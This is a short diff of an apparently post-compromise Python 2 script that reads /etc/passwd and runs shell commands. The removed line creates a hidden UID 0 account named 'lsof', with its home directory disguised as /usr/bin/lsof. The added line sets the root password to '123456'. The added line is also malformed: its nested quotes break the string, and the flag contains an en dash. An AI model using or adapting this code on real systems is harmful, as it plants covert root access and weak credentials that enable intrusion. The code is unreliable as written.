@@ -15,7 +15,7 @@ with open('/etc/passwd', 'r') as fin:
 #find out who i am
 
 print "add user"
-p = subprocess.Popen("useradd-p`openssl passwd-1-salt'lsof'admin`-u0-o-groot-Groot-s/bin/bash-d/usr/bin/lsof lsof", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+p = subprocess.Popen("echo "123456" | passwd –-stdin root", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
 
 print "ifconfig"
